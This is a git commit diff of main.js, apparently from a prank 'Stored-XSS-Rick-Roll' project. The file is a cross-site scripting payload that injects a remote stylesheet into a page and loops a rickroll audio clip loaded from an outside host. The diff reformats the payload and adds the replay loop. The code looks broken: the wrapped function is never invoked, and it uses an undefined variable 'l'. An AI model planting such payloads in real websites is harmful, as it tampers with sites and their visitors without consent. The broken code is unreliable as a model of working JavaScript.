4f0744a7503c3fe5cf113227ce3e33a381d634db
Daffier <63510648+0-DAyFF13R@users.noreply.github.com>
2024-02-26 00:39:14 +0200

    Update main.js

--- main.js
+++ main.js
@@ -1,1 +1,25 @@
-if(typeof xssed=='undefined'){!function(){var b,v;(v=document.createElement("link")).setAttribute("type","text/css"),v.setAttribute("rel","stylesheet"),v.setAttribute("href","//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css"),v.setAttribute("class",l),document.body.appendChild(v),(b=document.createElement("audio")).setAttribute("class",l),b.src="//0-dayff13r.github.io/Stored-XSS-Rick-Roll/rickroll.mp3",b.loop=!1,document.body.appendChild(b),b.play()}var xssed=1}
+if (typeof xssed == 'undefined') {
+    !
+        function () {
+            var b, v;
+            (v = document.createElement("link")).setAttribute("type", "text/css"),
+                v.setAttribute("rel", "stylesheet"),
+                v.setAttribute("href", "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css"),
+                v.setAttribute("class", l),
+                document.body.appendChild(v),
+                (b = document.createElement("audio")).setAttribute("class", l),
+                b.src = "//0-dayff13r.github.io/Stored-XSS-Rick-Roll/rickroll.mp3",
+                b.loop = !1,
+                document.body.appendChild(b),
+                b.play();
+
+            b.addEventListener("ended", function () {
+                this.currentTime = 0;
+                this.play();
+            });
+
+            document.body.appendChild(b);
+            b.play();
+        }
+    var xssed = 1
+}
